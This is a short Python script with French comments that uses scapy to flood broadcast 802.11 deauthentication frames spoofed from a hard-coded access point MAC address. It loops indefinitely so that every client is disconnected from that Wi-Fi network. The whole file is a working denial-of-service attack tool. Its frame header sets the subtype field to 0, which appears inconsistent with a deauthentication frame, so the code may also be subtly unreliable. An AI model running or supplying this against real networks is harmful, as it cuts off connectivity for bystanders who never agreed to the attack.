from scapy.all import *
import time

def deauth_all(ap_mac, interface):
    # Créer un paquet de déauthentification
    packet = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac, subtype=0x00)
    packet /= Dot11Deauth(reason=7)  # 7 = raison pour déauthentification

    # Envoyer le paquet en boucle avec une pause entre chaque envoi
    try:
        while True:
            sendp(packet, iface=interface, count=1, verbose=False)
            print(f"Deauthenticating all devices from {ap_mac}")
            time.sleep(0.1)  # Pause de 100 ms entre chaque envoi
    except KeyboardInterrupt:
        print("Déauthentification interrompue.")

# Remplacez par l'adresse MAC du point d'accès et l'interface réseau
ap_mac = "08:36:C9:98:11:A9"  # MAC du point d'accès
interface = "wlan1"           # Interface réseau

deauth_all(ap_mac, interface)
